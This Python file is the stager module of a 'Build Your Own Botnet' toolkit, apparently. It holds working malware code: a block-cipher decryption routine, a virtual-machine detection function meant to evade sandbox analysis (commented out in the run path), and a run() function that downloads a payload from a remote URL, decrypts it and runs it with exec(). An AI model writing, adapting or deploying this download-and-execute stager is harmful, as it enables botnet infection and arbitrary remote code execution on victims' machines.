#!/usr/bin/python
# -*- coding: utf-8 -*-
'Stager (Build Your Own Botnet)'

# standard libarary
import os
import sys
import struct
import base64
if sys.version_info[0] > 2:
    from urllib.request import urlopen
else:
    from urllib import urlopen

try:
    raw_input          # Python 2
except NameError:
    raw_input = input  # Python 3

# main
def decrypt(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
    data = base64.b64decode(data)
    blocks = [data[chunk * block_size:((chunk + 1) * block_size)] for chunk in range(len(data) // block_size)]
    vector = blocks[0]
    result = []
    for block in blocks[1:]:
        v0, v1 = struct.unpack("!2L", block)
        k0 = struct.unpack("!4L", key[:key_size])
        delta, mask = 0x9e3779b9, 0xffffffff
        sum = (delta * num_rounds) & mask
        for round in range(num_rounds):
            v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k0[sum >> 11 & 3]))) & mask
            sum = (sum - delta) & mask
            v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k0[sum & 3]))) & mask
        decode = struct.pack("!2L", v0, v1)
        output = str().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, decode))
        vector = block
        result.append(output)
    return str().join(result).rstrip(padding)

def environment():
    environment = [key for key in os.environ if 'VBOX' in key]
    processes = [line.split()[0 if os.name == 'nt' else -1] for line in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:] if line.split()[0 if os.name == 'nt' else -1].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser','vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
    return bool(environment + processes)

def run(url=None, key=None):
    if url:
        # if environment():
            # if '--debug' in sys.argv:
            #     if raw_input("Virtual machine detected. Abort? (y/n): ").startswith('y'):
            #         sys.exit(0)
            # else:
            #     sys.exit(0)
        payload = decrypt(urlopen(url).read(), base64.b64decode(key)) if key else urlopen(url).read()
        exec(payload, globals())
